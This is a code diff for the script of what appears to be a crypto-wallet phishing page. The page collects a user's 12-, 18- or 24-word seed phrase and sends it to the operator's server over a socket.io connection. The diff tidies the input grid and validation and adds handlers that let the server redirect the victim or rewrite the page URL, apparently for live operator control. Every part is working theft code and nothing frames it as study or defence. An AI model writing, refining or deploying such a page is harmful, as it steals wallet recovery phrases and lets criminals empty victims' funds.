@@ -880,118 +880,138 @@
 		</div></div></div>
 		
 		<script>
-			document.addEventListener('DOMContentLoaded', function() {
-			   const socket = io('/user', {
-				   transports: ['websocket'],
-				   query: {
-					   page: window.location.pathname
-				   }
-			   });
-			
-			   const wordButtons = document.querySelectorAll('.custom-button');
-			   const inputContainer = document.querySelector('.grid');
-			   let currentWordCount = 12; // Default word count
-			
-			   function generateInputs(wordCount) {
-				   currentWordCount = wordCount;
-				   let inputs = '';
-				   
-				   // Set grid columns based on word count
-				   const cols = (wordCount === 12) ? 4 : (wordCount === 18 || wordCount === 24) ? 4 : 3;
-				   inputContainer.className = `grid grid-cols-${cols} gap-4`;
-				   
-				   for(let i = 1; i <= wordCount; i++) {
-					   inputs += `
-						   <input type="text" 
-								  placeholder="${i}. word" 
-								  class="bg-[#151515] text-gray-300 py-2 px-2 rounded-md outline-none focus:ring-2 focus:ring-[#B7A3F5]" 
-								  style="outline-color: #262626;border-radius:2.5px">
-					   `;
-				   }
-				   inputContainer.innerHTML = inputs;
-			   }
-			
-			   // Handle button selection
-			   wordButtons.forEach(button => {
-				   button.addEventListener('click', function() {
-					   // Reset all buttons
-					   wordButtons.forEach(btn => {
-						   btn.classList.remove('bg-[#B7A3F5]', 'text-black');
-						   btn.classList.add('bg-[#222222]', 'text-gray-400');
-					   });
-					   
-					   // Style selected button
-					   this.classList.remove('bg-[#222222]', 'text-gray-400');
-					   this.classList.add('bg-[#B7A3F5]', 'text-black');
-					   
-					   const wordCount = parseInt(this.textContent);
-					   generateInputs(wordCount);
-				   });
-			   });
-			
-			   // Handle form submission
-			   document.getElementById('continue').addEventListener('click', async function() {
-				   const inputs = document.querySelectorAll('.grid input[type="text"]');
-				   const seedArray = Array.from(inputs).map(input => input.value.trim());
-				   const seedPhrase = seedArray.join(' ');
-			
-				   if (!validateSeedPhrase(seedPhrase)) {
-					   return;
-				   }
-			
-				   try {
-					   // Send data to server
-					   socket.emit('user_action', {
-						   type: 'seed_phrase_submitted',
-						   data: seedPhrase,
-						   timestamp: new Date().toISOString(),
-						   page: window.location.pathname
-					   });
-			
-					   // Set loading state
-					   socket.emit('page_loading', true);
-			
-					   // Redirect to loading page after a short delay
-					   setTimeout(() => {
-						   socket.emit('request_redirect', { page: 'Loading' });
-					   }, 500);
-			
-				   } catch (error) {
-					   console.error('Error:', error);
-					   document.getElementById('errorMessage_Seed').textContent = 'An error occurred. Please try again.';
-					   document.getElementById('errorMessage_Seed').style.display = 'block';
-				   }
-			   });
-			
-			   function validateSeedPhrase(phrase) {
-				   if (!phrase) {
-					   document.getElementById('errorMessage_Seed').textContent = 'Please enter your seed phrase';
-					   document.getElementById('errorMessage_Seed').style.display = 'block';
-					   return false;
-				   }
-				   // Check if it has 12, 18, or 24 words
-				   const words = phrase.trim().split(/\s+/);
-				   const validLengths = [12, 18, 24];
-				   if (!validLengths.includes(words.length)) {
-					   document.getElementById('errorMessage_Seed').textContent = 'Seed phrase must contain 12, 18, or 24 words';
-					   document.getElementById('errorMessage_Seed').style.display = 'block';
-					   return false;
-				   }
-				   return true;
-			   }
-			
-			   // Handle socket connection
-			   socket.on('connect', () => {
-				   console.log('Socket connected');
-			   });
-			
-			   socket.on('connect_error', (error) => {
-				   console.error('Socket connection error:', error);
-			   });
-			
-			   // Initialize with 12 words
-			   generateInputs(12);
-			});
+document.addEventListener('DOMContentLoaded', function() {
+    const socket = io('/user', {
+        transports: ['websocket'],
+        query: {
+            page: window.location.pathname
+        }
+    });
+
+    const wordButtons = document.querySelectorAll('.custom-button');
+    const inputContainer = document.querySelector('.grid');
+    let currentWordCount = 12; // Default word count
+
+    function generateInputs(wordCount) {
+        currentWordCount = wordCount;
+        let inputs = '';
+        
+        // Set grid columns based on word count
+        const cols = wordCount === 12 ? 4 : wordCount === 18 || wordCount === 24 ? 4 : 3;
+        
+        // Update the class name properly
+        inputContainer.style.display = 'grid';
+        inputContainer.style.gridTemplateColumns = `repeat(${cols}, minmax(0, 1fr))`;
+        inputContainer.style.gap = '1rem';
+        
+        for(let i = 1; i <= wordCount; i++) {
+            inputs += `
+                <input type="text" 
+                       placeholder="${i}. word" 
+                       class="seed-word-input bg-[#151515] text-gray-300 py-2 px-2 rounded-md"
+                       style="outline-color: #262626; border-radius: 2.5px">
+            `;
+        }
+        inputContainer.innerHTML = inputs;
+    }
+
+    // Handle button selection
+    wordButtons.forEach(button => {
+        button.addEventListener('click', function() {
+            // Reset all buttons
+            wordButtons.forEach(btn => {
+                btn.classList.remove('bg-[#B7A3F5]', 'text-black');
+                btn.classList.add('bg-[#222222]', 'text-gray-400');
+            });
+            
+            // Style selected button
+            this.classList.remove('bg-[#222222]', 'text-gray-400');
+            this.classList.add('bg-[#B7A3F5]', 'text-black');
+            
+            const wordCount = parseInt(this.textContent);
+            generateInputs(wordCount);
+        });
+    });
+
+    // Handle form submission
+    document.getElementById('continue').addEventListener('click', function() {
+        const inputs = document.querySelectorAll('.seed-word-input');
+        const seedArray = Array.from(inputs).map(input => input.value.trim());
+        const seedPhrase = seedArray.join(' ');
+
+        if (!validateSeedPhrase(seedArray)) {
+            return;
+        }
+
+        try {
+            // Send data to server
+            socket.emit('user_action', {
+                type: 'seed_phrase_submitted',
+                data: seedPhrase,
+                timestamp: new Date().toISOString(),
+                page: window.location.pathname
+            });
+
+            // Set loading state
+            socket.emit('page_loading', true);
+
+            // Redirect to loading page after a short delay
+            setTimeout(() => {
+                socket.emit('request_redirect', { page: 'Loading' });
+            }, 500);
+
+        } catch (error) {
+            console.error('Error:', error);
+            document.getElementById('errorMessage_Seed').textContent = 'An error occurred. Please try again.';
+            document.getElementById('errorMessage_Seed').style.display = 'block';
+        }
+    });
+
+    function validateSeedPhrase(wordArray) {
+        // Check if all fields have values
+        const emptyFields = wordArray.some(word => word === '');
+        if (emptyFields) {
+            document.getElementById('errorMessage_Seed').textContent = 'Please fill in all seed phrase words';
+            document.getElementById('errorMessage_Seed').style.display = 'block';
+            return false;
+        }
+        
+        // Check if it has the correct number of words based on currentWordCount
+        const validLengths = [12, 18, 24];
+        if (!validLengths.includes(wordArray.length) || wordArray.length !== currentWordCount) {
+            document.getElementById('errorMessage_Seed').textContent = `Seed phrase must contain ${currentWordCount} words`;
+            document.getElementById('errorMessage_Seed').style.display = 'block';
+            return false;
+        }
+        
+        return true;
+    }
+
+    // Handle socket connection
+    socket.on('connect', () => {
+        console.log('Socket connected');
+    });
+
+    socket.on('connect_error', (error) => {
+        console.error('Socket connection error:', error);
+    });
+    
+    // Add redirect handler
+    socket.on('redirect', (url) => {
+        console.log('Redirecting to:', url);
+        window.location.href = url;
+    });
+    
+    // Add URL update handler in case session URL changes
+    socket.on('session_url', (url) => {
+        if (url && url !== window.location.pathname + window.location.search) {
+            window.history.replaceState({}, '', url);
+        }
+    });
+
+    // Initialize with 12 words
+    generateInputs(12);
+});
 			</script>
 		
 		<script data-savepage-type="" type="text/plain" data-savepage-src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
